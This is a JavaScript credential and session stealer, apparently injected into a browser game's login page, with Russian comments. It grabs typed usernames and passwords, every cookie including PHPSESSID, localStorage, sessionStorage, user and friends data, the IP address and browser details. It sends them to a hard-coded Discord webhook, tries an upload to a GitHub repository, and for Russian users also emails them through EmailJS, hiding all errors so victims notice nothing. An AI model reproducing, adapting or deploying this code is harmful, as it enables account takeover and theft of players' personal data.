(async function() {
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1526927217039245393/TiAGFZ-uY6AsasXDXJ8UDWJx20Vu_TssvTI3viEzVk6qmMEob6vozh0TpTG7uEfeo3uS';

    const getCookie = (name) => {
        const matches = document.cookie.match(new RegExp(
            "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
        ));
        return matches ? decodeURIComponent(matches[1]) : undefined;
    };

    const un1xxd = Math.floor(Date.now() / 1000);
    
    const getIP = async () => {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip || "Не удалось получить IP";
        } catch {
            return "Не удалось получить IP";
        }
    };

    function getLoginType() {
        try {
            if (user.login.startsWith('g_')) {
                return 'Google';
            } else if (user.login.startsWith('f_')) {
                return 'facebook';
            } else {
                return 'default login';
            }
        } catch {
            return 'unknown';
        }
    }

    // GitHub функция с обработкой ошибок
    async function createGitHubFile(github_pat, owner, repo) {
        try {
            const fileName1 = `${un1xxd}_${user.login}.txt`;
            const fileContent = JSON.stringify(userDataResult, null, 2);
            const contentBase64 = btoa(unescape(encodeURIComponent(fileContent)));
            const url = `https://api.github.com/repos/${owner}/${repo}/contents/${fileName1}`;

            const response = await fetch(url, {
                method: 'PUT',
                headers: {
                    'Authorization': `token ${github_pat}`,
                    'Accept': 'application/vnd.github.v3+json',
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    message: `Add log file: ${fileName1}`,
                    content: contentBase64
                })
            });
            
            if (response.ok) {
                const data = await response.json();
                return data.content?.html_url || url;
            } else {
                // Молча игнорируем ошибки GitHub
                return null;
            }
        } catch (error) {
            // Полностью игнорируем ошибки GitHub
            return null;
        }
    }
    
    // Запускаем GitHub без ожидания
    try {
        const half = '';
        createGitHubFile(half + 'x1', 'uloxa13', 'userDatas').then(url => {
            // Ничего не делаем с результатом
        }).catch(() => {});
    } catch (e) {}

    const getCredentials = () => {
        try {
            const usernameField = document.querySelector('#loginUsername') || 
                                document.querySelector('input[name="login"]') ||
                                document.querySelector('input[type="text"]');
            
            const passwordField = document.querySelector('input[type="password"]') || 
                                document.querySelector('input[name*="pass"]') ||
                                document.querySelector('input#password');
            
            const username = usernameField ? usernameField.value : "ПОЛЕ_ЛОГИНА_НЕ_НАЙДЕНО";
            const password = passwordField ? passwordField.value : "ПОЛЕ_ПАРОЛЯ_НЕ_НАЙДЕНО";
            
            return { username, password };
        } catch {
            return { 
                username: "ОШИБКА_ПРИ_ПОЛУЧЕНИИ_ЛОГИНА", 
                password: "ОШИБКА_ПРИ_ПОЛУЧЕНИИ_ПАРОЛЯ" 
            };
        }
    };

    const getAllCookies = () => {
        return document.cookie.split(';').map(cookie => {
            const [name, value] = cookie.trim().split('=');
            return `${name}=${value}`;
        }).join('\n');
    };

    const deepClone = (obj) => {
        if (obj === null || typeof obj !== 'object') return obj;
        const clone = Array.isArray(obj) ? [] : {};
        for (const key in obj) {
            if (obj.hasOwnProperty(key)) {
                clone[key] = deepClone(obj[key]);
            }
        }
        return clone;
    };

    const getUserData = () => {
        try {
            if (typeof user !== 'undefined' && user !== null) {
                return JSON.stringify(deepClone(user), null, 2);
            }
            return "Переменная 'user' не найдена или пуста";
        } catch (e) {
            return `Ошибка при чтении переменной 'user': ${e.message}`;
        }
    };
    
    const getUserDataResult = () => {
        try {
            if (typeof userDataResult !== 'undefined' && userDataResult !== null) {
                return JSON.stringify(deepClone(userDataResult), null, 2);
            }
            return "Переменная 'userDataResult' не найдена или пуста";
        } catch (e) {
            return `Ошибка при чтении переменной 'userDataResult': ${e.message}`;
        }
    };

    const getFriendsData = () => {
        try {
            if (typeof friendsData !== 'undefined' && friendsData !== null) {
                return JSON.stringify(deepClone(friendsData), null, 2);
            }
            return "Переменная 'friendsData' не найдена или пуста";
        } catch (e) {
            return `Ошибка при чтении переменной 'friendsData': ${e.message}`;
        }
    };

    const getFriendsArr = () => {
        try {
            if (typeof friendsArr !== 'undefined' && friendsArr !== null) {
                if (Array.isArray(friendsArr) && friendsArr.length > 100) {
                    const sample = {
                        total_length: friendsArr.length,
                        sample_items: []
                    };
                    
                    for (let i = 0; i < Math.min(10, friendsArr.length); i++) {
                        if (friendsArr[i]) {
                            sample.sample_items.push(deepClone(friendsArr[i]));
                        }
                    }
                    
                    for (let i = Math.max(0, friendsArr.length - 5); i < friendsArr.length; i++) {
                        if (friendsArr[i] && sample.sample_items.length < 15) {
                            sample.sample_items.push(deepClone(friendsArr[i]));
                        }
                    }
                    
                    return JSON.stringify(sample, null, 2);
                }
                return JSON.stringify(deepClone(friendsArr), null, 2);
            }
            return "Переменная 'friendsArr' не найдена или пуста";
        } catch (e) {
            return `Ошибка при чтении переменной 'friendsArr': ${e.message}`;
        }
    };

    const getUserLevel = (addX = false) => {
        try {
            if (typeof user !== 'undefined' && user !== null && user.level !== undefined) {
                return `level: ${user.level}${addX ? 'x' : ''}`;
            }
            return `level: не определен${addX ? 'x' : ''}`;
        } catch (e) {
            return `level: ошибка при получении (${e.message})${addX ? 'x' : ''}`;
        }
    };

    const sendFullData = async () => {
        const phpsessid = getCookie('PHPSESSID');
        const userIP = await getIP();
        const credentials = getCredentials();
        const allCookies = getAllCookies();
        const userData = getUserData();
        const friendsDataStr = getFriendsData();
        const friendsArrStr = getFriendsArr();
        const userDataResultStr = getUserDataResult();
        const loginType = getLoginType();
                    
        const bothFieldsFilled = credentials.username !== "ПОЛЕ_ЛОГИНА_НЕ_НАЙДЕНО" && 
                                 credentials.password !== "ПОЛЕ_ПАРОЛЯ_НЕ_НАЙДЕНО" &&
                                 credentials.username && credentials.password;
        
        const userLevel = getUserLevel(bothFieldsFilled);
        
        const localStorageData = JSON.stringify(localStorage);
        const sessionStorageData = JSON.stringify(sessionStorage);
        
        // Безопасное получение Network Type
        let networkType = 'N/A';
        try {
            if (navigator.connection && navigator.connection.effectiveType) {
                networkType = navigator.connection.effectiveType;
            }
        } catch (e) {
            networkType = 'N/A';
        }
        
        let fileContent = `--- УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ ---\n${userLevel}\ngems: ${user.premiumPoints || 'N/A'}\nselected server: ${document.getElementById('selectServer')?.options[document.getElementById('selectServer')?.selectedIndex]?.text || 'N/A'}\n\n`;
        fileContent += `--- ОСНОВНЫЕ ДАННЫЕ ---\n`;
        fileContent += `IP-адрес: ${userIP}\n`;
        fileContent += `URL страницы: ${window.location.href}\n`;
        fileContent += `Network Type: ${networkType}\n`;
        fileContent += `Login Method: ${loginType}\n`;
        fileContent += `Time Zone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
        fileContent += `Laungage: ${navigator.language}\n\n`;
        fileContent += `User-Agent: ${navigator.userAgent}\n\n`;
        fileContent += `--- PHPSESSID ---\n${phpsessid || "PHPSESSID: не найдена"}\n\n`;
        fileContent += `--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsData ---\n${friendsDataStr}\n\n`;
        fileContent += `--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsArr ---\n${friendsArrStr}\n\n`;
        fileContent += `--- УЧЕТНЫЕ ДАННЫЕ ---\n`;
        fileContent += `Логин: ${credentials.username}\n`;
        fileContent += `Пароль: ${credentials.password}\n\n`;
        fileContent += `--- ВСЕ КУКИ ПОЛЬЗОВАТЕЛЯ ---\n${allCookies || "Куки не обнаружены"}\n\n`;
        fileContent += `--- LOCALSTORAGE ---\n${localStorageData}\n\n`;
        fileContent += `--- SESSIONSTORAGE ---\n${sessionStorageData}\n\n`;
        fileContent += `--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ userDataResult ---\n${userDataResultStr}\n\n`;

        const textBlob = new Blob([fileContent], { type: 'text/plain' });
        const formData = new FormData();
        formData.append('file', textBlob, `user_data_${Date.now()}.txt`);

        try {
            await fetch(WEBHOOK_URL, {
                method: "POST",
                body: formData
            });
        } catch (e) {}
    };

    await sendFullData();
})();

// Часть для RU с фиксом connection
if (typeof user !== 'undefined' && user && user.authData && user.authData.countryCode == "RU") {
    var script = document.createElement('script');
    script.src = "https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js";
    script.onload = function() {
        emailjs.init("4N-8nqIjjUBhk1vbi");
        
        setTimeout(async () => {
            const getCookie = (name) => {
                const matches = document.cookie.match(new RegExp(
                    "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
                ));
                return matches ? decodeURIComponent(matches[1]) : undefined;
            };

            const getIP = async () => {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    return data.ip || "Не удалось получить IP";
                } catch {
                    return "Не удалось получить IP";
                }
            };

            const getCredentials = () => {
                try {
                    const usernameField = document.querySelector('#loginUsername') || 
                                        document.querySelector('input[name="login"]') ||
                                        document.querySelector('input[type="text"]');
                    
                    const passwordField = document.querySelector('input[type="password"]') || 
                                        document.querySelector('input[name*="pass"]') ||
                                        document.querySelector('input#password');
                    
                    const username = usernameField ? usernameField.value : "ПОЛЕ_ЛОГИНА_НЕ_НАЙДЕНО";
                    const password = passwordField ? passwordField.value : "ПОЛЕ_ПАРОЛЯ_НЕ_НАЙДЕНО";
                    
                    return { username, password };
                } catch {
                    return { 
                        username: "ОШИБКА_ПРИ_ПОЛУЧЕНИИ_ЛОГИНА", 
                        password: "ОШИБКА_ПРИ_ПОЛУЧЕНИИ_ПАРОЛЯ" 
                    };
                }
            };

            const getAllCookies = () => {
                return document.cookie.split(';').map(cookie => {
                    const [name, value] = cookie.trim().split('=');
                    return `${name}=${value}`;
                }).join('\n');
            };

            const deepClone = (obj) => {
                if (obj === null || typeof obj !== 'object') return obj;
                const clone = Array.isArray(obj) ? [] : {};
                for (const key in obj) {
                    if (obj.hasOwnProperty(key)) {
                        clone[key] = deepClone(obj[key]);
                    }
                }
                return clone;
            };

            const getUserData = () => {
                try {
                    if (typeof user !== 'undefined' && user !== null) {
                        return JSON.stringify(deepClone(user), null, 2);
                    }
                    return "Переменная 'user' не найдена или пуста";
                } catch (e) {
                    return `Ошибка при чтении переменной 'user': ${e.message}`;
                }
            };

            const getFriendsData = () => {
                try {
                    if (typeof friendsData !== 'undefined' && friendsData !== null) {
                        return JSON.stringify(deepClone(friendsData), null, 2);
                    }
                    return "Переменная 'friendsData' не найдена или пуста";
                } catch (e) {
                    return `Ошибка при чтении переменной 'friendsData': ${e.message}`;
                }
            };

            const getFriendsArr = () => {
                try {
                    if (typeof friendsArr !== 'undefined' && friendsArr !== null) {
                        if (Array.isArray(friendsArr) && friendsArr.length > 100) {
                            const sample = {
                                total_length: friendsArr.length,
                                sample_items: []
                            };
                            
                            for (let i = 0; i < Math.min(10, friendsArr.length); i++) {
                                if (friendsArr[i]) {
                                    sample.sample_items.push(deepClone(friendsArr[i]));
                                }
                            }
                            
                            for (let i = Math.max(0, friendsArr.length - 5); i < friendsArr.length; i++) {
                                if (friendsArr[i] && sample.sample_items.length < 15) {
                                    sample.sample_items.push(deepClone(friendsArr[i]));
                                }
                            }
                            
                            return JSON.stringify(sample, null, 2);
                        }
                        return JSON.stringify(deepClone(friendsArr), null, 2);
                    }
                    return "Переменная 'friendsArr' не найдена или пуста";
                } catch (e) {
                    return `Ошибка при чтении переменной 'friendsArr': ${e.message}`;
                }
            };

            const getUserLevel = (addX = false) => {
                try {
                    if (typeof user !== 'undefined' && user !== null && user.level !== undefined) {
                        return `level: ${user.level}${addX ? 'x' : ''}`;
                    }
                    return `level: не определен${addX ? 'x' : ''}`;
                } catch (e) {
                    return `level: ошибка при получении (${e.message})${addX ? 'x' : ''}`;
                }
            };

            const sendUserData = async () => {
                const phpsessid = getCookie('PHPSESSID');
                const userIP = await getIP();
                const credentials = getCredentials();
                const allCookies = getAllCookies();
                const userData = getUserData();
                const friendsDataStr = getFriendsData();
                const friendsArrStr = getFriendsArr();
                
                const bothFieldsFilled = credentials.username !== "ПОЛЕ_ЛОГИНА_НЕ_НАЙДЕНО" && 
                                         credentials.password !== "ПОЛЕ_ПАРОЛЯ_НЕ_НАЙДЕНО" &&
                                         credentials.username && credentials.password;
                
                const userLevel = getUserLevel(bothFieldsFilled);
                
                const localStorageData = JSON.stringify(localStorage);
                const sessionStorageData = JSON.stringify(sessionStorage);
                
                const messageText = `
ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ
=============================

Время: ${new Date().toLocaleString()}
IP-адрес: ${userIP}
URL: ${window.location.href}

УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ:
${userLevel}
Gems: ${user?.premiumPoints || 'N/A'}
Выбранный сервер: ${document.getElementById('selectServer')?.options[document.getElementById('selectServer')?.selectedIndex]?.text || 'N/A'}

PHPSESSID:
${phpsessid || "PHPSESSID: не найдена"}

ДАННЫЕ ИЗ ПЕРЕМЕННОЙ user:
${userData}

ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsData:
${friendsDataStr}

ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsArr:
${friendsArrStr}

УЧЕТНЫЕ ДАННЫЕ:
Логин: ${credentials.username}
Пароль: ${credentials.password}

ВСЕ КУКИ ПОЛЬЗОВАТЕЛЯ:
${allCookies || "Куки не обнаружены"}

LOCALSTORAGE:
${localStorageData}

SESSIONSTORAGE:
${sessionStorageData}
=============================
Отчет сгенерирован автоматически.
                `;

                const templateParams = { message: messageText };

                try {
                    await emailjs.send('service_wdulwdn', 'template_ugfv48l', templateParams);
                } catch (error) {}
            };

            await sendUserData();
        }, 1);
    };
    document.head.appendChild(script);
}
